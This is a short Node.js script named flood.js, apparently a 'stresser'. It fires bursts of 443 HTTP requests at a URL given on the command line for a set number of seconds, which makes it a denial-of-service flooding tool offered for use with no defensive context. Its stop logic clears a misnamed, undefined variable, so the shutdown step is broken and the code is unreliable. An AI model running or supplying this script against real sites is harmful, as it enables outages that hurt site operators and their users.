const target = process.argv[2];
const duration = process.argv[3];

if (process.argv.length < 4 || isNaN(parseInt(duration))) {
    console.log('Invalid Usage: node flood.js URL DURATION.');
    process.exit(1)
} else {
    const IntervalAttack = setInterval(() => {
                for (let i = 0; i < 443; i++) {
            fetch(target).catch(error => {});
 }
        
    });
    setTimeout(() => {
        clearInterval(attackInterval);
        console.log('Sukses Attack stopped Flaying stresser.');
        process.exit(0);
    }, duration * 1000);
}